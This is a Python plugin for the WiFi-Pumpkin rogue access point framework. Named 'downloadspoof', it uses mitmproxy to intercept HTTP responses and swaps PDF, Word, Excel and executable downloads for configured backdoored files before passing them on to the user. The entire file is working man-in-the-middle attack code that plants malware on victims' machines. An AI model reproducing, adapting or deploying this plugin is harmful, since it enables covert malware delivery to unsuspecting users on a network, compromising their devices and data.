from os import path
from mitmproxy.models import decoded
from plugins.extension.plugin import PluginTemplate

"""
Description:
    This program is a core for wifi-pumpkin.py. file which includes functionality
    plugins for Pumpkin-Proxy.

Copyright:
    Copyright (C) 2015-2016 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""

exe_mimetypes = ['application/octet-stream', 'application/x-msdownload', 
'application/exe', 'application/x-exe', 'application/dos-exe', 'vms/exe',
'application/x-winexe', 'application/msdos-windows', 'application/x-msdos-program']

class downloadspoof(PluginTemplate):
    meta = {
        'Name'      : 'downloadspoof',
        'Version'   : '1.0',
        'Description' : 'Replace files being downloaded via HTTP with malicious versions.',
        'Author'    : 'Marcos Nesster'
    }
    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = True
        self.payloads = {
        'application/pdf': self.config.get_setting('set_downloadspoof','backdoorPDFpath'),
        'application/msword': self.config.get_setting('set_downloadspoof','backdoorWORDpath'),
        'application/x-msexcel' : self.config.get_setting('set_downloadspoof','backdoorXLSpath'),
        }
        for mime in exe_mimetypes:
            self.payloads[mime] = self.config.get_setting('set_downloadspoof','backdoorExePath')

    def request(self, flow):
        pass

    def response(self, flow):
        try:
            # for another format file types
            content = flow.response.headers['Content-Type']
            if content in self.payloads:
                if path.isfile(self.payloads[content]):
                    with decoded(flow.response): 
                        self.send_output.emit('[downloadspoof]:: URL: {}'.format(flow.request.url))
                        self.send_output.emit("[downloadspoof]:: Replaced file of mimtype {} with malicious version".format(content))
                        flow.response.content = open(self.payloads[content],'rb').read()
                        self.send_output.emit('[downloadspoof]:: Patching complete, forwarding to user...')
                    return 
                self.send_output.emit('[downloadspoof]:: {}, Error Path file not found\n'.format(self.payloads[content]))
        except Exception as e:
            pass